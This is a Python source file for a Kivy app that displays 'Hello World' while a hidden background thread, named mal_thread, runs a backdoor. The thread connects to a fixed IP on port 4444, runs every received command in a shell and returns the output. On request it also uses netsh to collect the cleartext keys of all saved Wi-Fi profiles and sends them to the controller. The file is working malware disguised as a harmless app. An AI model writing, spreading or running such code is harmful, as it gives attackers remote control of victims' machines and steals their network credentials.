from kivy.app import App
from kivy.uix.label import Label

import threading
import socket
import subprocess,re,json

def show():
    command_output = subprocess.run(
        ["netsh", "wlan", "show", "profiles"], capture_output=True
    ).stdout.decode()
    command_output = command_output.replace("    All User Profile     : ", "").replace("\r", "").split("\n")[9:]
    wifi_list = []
    if len(command_output) != 0:
        for name in command_output:
            wifi_profile = {}
            profile_info = subprocess.run(
                ["netsh", "wlan", "show", "profile", f'"{name}"'], capture_output=True
            ).stdout.decode()
            if re.search("Security key           : Present", profile_info):
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f'"{name}"', "key=clear"],
                    capture_output=True,
                ).stdout.decode()
                password = re.search(
                    "Key Content            : (.*)\r", profile_info_pass
                )
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)

    for i in wifi_list:
        print(f"{i['ssid']} : {i['password']}")
    
    return json.dumps(wifi_list)

def main():
    server_ip = '192.168.120.16'
    port = 4444
    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        if "show wifi passwords" in command:
            backdoor.send(show().encode())
            pass
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)


class App(App):
    def build(self):
        return Label(text="Hello World")



mal_thread = threading.Thread(target=main)
mal_thread.start()


app = App()
app.run()